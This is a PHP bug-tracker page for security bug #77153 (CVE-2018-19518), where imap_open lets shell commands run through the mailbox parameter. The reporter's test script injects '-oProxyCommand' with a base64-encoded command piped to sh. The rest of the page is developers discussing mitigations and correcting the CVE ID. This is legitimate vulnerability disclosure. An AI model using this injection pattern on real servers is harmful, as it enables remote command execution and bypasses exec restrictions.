<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='IMAP related Bug #77153 - RDF' href='rss/bug.php?id=77153'>
        <link rel='alternate' type='application/rss+xml' title='IMAP related Bug #77153 - RSS 2.0' href='rss/bug.php?id=77153&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #77153 :: imap_open allows to run arbitrary shell commands via mailbox parameter</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=77153">Sec Bug</a>&nbsp;#77153</th>
            <td id="summary" colspan="5">imap_open allows to run arbitrary shell commands via mailbox parameter</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2018-11-14 17:54 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2019-01-31 23:26 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=IMAP+related">IMAP related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.38</td>
            <th class="details">OS:</th>
            <td>Debian-like ( debian / ubuntu )</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19518" target="_blank">2018-19518</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=77153&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=77153&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=77153&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1542218045">&nbsp;</a><strong>[2018-11-14 17:54 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Bypassing disabled exec functions in PHP via imap_open (Debian &amp; Ubuntu)

this bug has already been made public : 

- <a href="https://antichat.com/threads/463395/#post-4254681" rel="nofollow">https://antichat.com/threads/463395/#post-4254681</a>
- <a href="https://github.com/Bo0oM/PHP_imap_open_exploit" rel="nofollow">https://github.com/Bo0oM/PHP_imap_open_exploit</a>

Test script:
---------------
&lt;?php

# echo '1234567890'&gt;/tmp/test0001

// $server = $_POST['server'] ??? 
$server = &quot;x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}&quot;;

imap_open('{'.$server.':143/imap}INBOX', '', '') or die(&quot;\n\nError: &quot;.imap_last_error());


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=77153'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=77153'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1542218287">&nbsp;</a><strong>[2018-11-14 17:58 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Operating System: Debin-like ( debin / ubuntu )</span>
<span class="added">+Operating System: Debian-like ( debian / ubuntu )</span>
</div></div></div><div class='comment type_comment' ><a name="1542218287">&nbsp;</a><strong>[2018-11-14 17:58 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>fix typo in os name
</pre>
</div><div class='comment type_comment' ><a name="1542218830">&nbsp;</a><strong>[2018-11-14 18:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Huh, imap library just runs external commands with no escaping whatsoever? This sucks :(

I guess we need to add some filters there. Not sure whether this ssh/rsh thing is even useful... But we probably could at least filter the hostname.
</pre>
</div><div class='comment type_log' ><a name="1542218920">&nbsp;</a><strong>[2018-11-14 18:08 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: bypass disabled exec function</span>
<span class="added">+Summary: imap_open allows to run arbitrary shell commands via
          mailbox parameter</span>
</div></div></div><div class='comment type_comment' ><a name="1542222674">&nbsp;</a><strong>[2018-11-14 19:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>And mailbox parsing happens inside c-client, so we have no control over it. Looks like we'd have to disassemble the mbox string, validate it and re-assemble it back. Maybe also add /norsh by default.
</pre>
</div><div class='comment type_related' ><a name="1542278378">&nbsp;</a><strong>[2018-11-15 10:39 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=77160'>Bug #77160</a>
</pre>
</div><div class='comment type_comment' ><a name="1542296655">&nbsp;</a><strong>[2018-11-15 15:44 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>&gt; Maybe also add /norsh by default.

Iff that would resolve the RCE vulnerability, we may consider
to disable rsh support globally.  From imap.2007f/docs/FAQ.txt:

| You can disable rsh globally by setting the rsh timeout value
| to 0 with the call:
| mail_parameters (NIL,SET_RSHTIMEOUT,0);

Calling this in MINIT[1] *might* be sufficient.

Anyhow, since this issue is already lively discussed in public, I
think we have to hurry up with a solution.

[1] &lt;<a href="https://gist.github.com/cmb69/b3ca981599bf21004c6417ab64dea4b7#file-disable-rsh-globally-patch" rel="nofollow">https://gist.github.com/cmb69/b3ca981599bf21004c6417ab64dea4b7#file-disable-rsh-globally-patch</a>&gt;
</pre>
</div><div class='comment type_comment' ><a name="1542310554">&nbsp;</a><strong>[2018-11-15 19:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Would this also disable SSH functionality? Because there's also ssh (which seems to be different branch from rsh, though on Debian it's the same thing in fact, but not on other systems) and it may be vulnerable too. 

It is also BC break so we'd probably have to announce it and put it into UPGRADING.
</pre>
</div><div class='comment type_comment' ><a name="1542312037">&nbsp;</a><strong>[2018-11-15 20:00 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>OK, there's also SET_SSHTIMEOUT, so probably we'd need to do both of them. We may allow a way to enable them back though, in case anybody needs it (doubtful, but who knows?)
</pre>
</div><div class='comment type_log' ><a name="1542312261">&nbsp;</a><strong>[2018-11-15 20:04 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: imap_open allows to run arbitrary shell commands via
          mailbox parameter</span>
<span class="added">+Summary: bypass disabled exec function</span>
</div></div></div><div class='comment type_comment' ><a name="1542312261">&nbsp;</a><strong>[2018-11-15 20:04 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>i think maybe adding a `php.ini` directive for it defaulting to 0 should do it.

example :

imap.set_rshtimeout=0
imap.set_sshtimeout=0
</pre>
</div><div class='comment type_log' ><a name="1542312457">&nbsp;</a><strong>[2018-11-15 20:07 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: bypass disabled exec function</span>
<span class="added">+Summary: imap_open allows to run arbitrary shell commands via
          mailbox parameter</span>
</div></div></div><div class='comment type_comment' ><a name="1542312457">&nbsp;</a><strong>[2018-11-15 20:07 UTC] azjezz &#x61;&#116; protonmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>revert summary change
</pre>
</div><div class='comment type_comment' ><a name="1542327375">&nbsp;</a><strong>[2018-11-16 00:16 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>Indeed, (a) new ini option(s) might be appropriate for BC reasons.
I think we should reduce these to a minimum (maybe just a boolean
imap.allow_sh).

FTR: not only imap_open() seems to be affected by this issue, but
also imap_createmailbox() and imap_append() and maybe others.
</pre>
</div><div class='comment type_log' ><a name="1542574673">&nbsp;</a><strong>[2018-11-18 20:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: Irrelevant</span>
<span class="added">+PHP Version: 5.6.38</span>
</div></div></div><div class='comment type_comment' ><a name="1542589982">&nbsp;</a><strong>[2018-11-19 01:13 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Proposed patch:

<a href="https://gist.github.com/smalyshev/aae34ba0a831e9a5c4824b1ee89579c2" rel="nofollow">https://gist.github.com/smalyshev/aae34ba0a831e9a5c4824b1ee89579c2</a>

I plan to merge it sometime early next week, if there are no objections, since the issue is already public. It is somewhat of a BC break but I don't think we have a choice here.
</pre>
</div><div class='comment type_comment' ><a name="1542590018">&nbsp;</a><strong>[2018-11-19 01:13 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The patch is for 5.6, I'll upmerge it of course.
</pre>
</div><div class='comment type_log' ><a name="1542590027">&nbsp;</a><strong>[2018-11-19 01:13 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1542661724">&nbsp;</a><strong>[2018-11-19 21:08 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Opening it since it's essentially in public anyway.
</pre>
</div><div class='comment type_comment' ><a name="1542698599">&nbsp;</a><strong>[2018-11-20 07:23 UTC] c &#x64;&#111;&#x74; r &#x64;&#111;&#x74; l &#x64;&#111;&#x74; f &#x61;&#116; yandex &#x64;&#111;&#x74; ru</strong>
<pre class='note'>Guys this is the same research from #76428 which you totally ignored.
</pre>
</div><div class='comment type_comment' ><a name="1542698877">&nbsp;</a><strong>[2018-11-20 07:27 UTC] c &#x64;&#111;&#x74; r &#x64;&#111;&#x74; l &#x64;&#111;&#x74; f &#x61;&#116; yandex &#x64;&#111;&#x74; ru</strong>
<pre class='note'>stas@php.net knew about this from 2018-06-20.
</pre>
</div><div class='comment type_comment' ><a name="1542699876">&nbsp;</a><strong>[2018-11-20 07:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Yes, I did not realize at the time c-client is essentially a dead project and is not going to be fixed. Now I realize that so it looks like we need to mitigate it in PHP (even though it's not directly a PHP issue).
</pre>
</div><div class='comment type_related' ><a name="1542742665">&nbsp;</a><strong>[2018-11-20 19:37 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=76428'>Bug #76428</a>
</pre>
</div><div class='comment type_log' ><a name="1542742684">&nbsp;</a><strong>[2018-11-20 19:38 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_log' ><a name="1542765244">&nbsp;</a><strong>[2018-11-21 01:54 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_log' ><a name="1543828526">&nbsp;</a><strong>[2018-12-03 09:15 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2018-19158</span>
</div></div></div><div class='comment type_comment' ><a name="1544546546">&nbsp;</a><strong>[2018-12-11 16:42 UTC] anarcat &#x61;&#116; debian &#x64;&#111;&#x74; org</strong>
<pre class='note'>CVE-2018-19158 is a typo. mitre actually allocated CVE-2018-19518 instead, see also <a href="https://www.openwall.com/lists/oss-security/2018/12/05/2" rel="nofollow">https://www.openwall.com/lists/oss-security/2018/12/05/2</a>

could some php.net fix the metadata here? I'll request Mitre reserve the erroneous CVE since it's been used in some other places already and should probably be discarded to avoid the confusion.
</pre>
</div><div class='comment type_log' ><a name="1548977204">&nbsp;</a><strong>[2019-01-31 23:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: 2018-19158</span>
<span class="added">+CVE-ID: 2018-19518</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
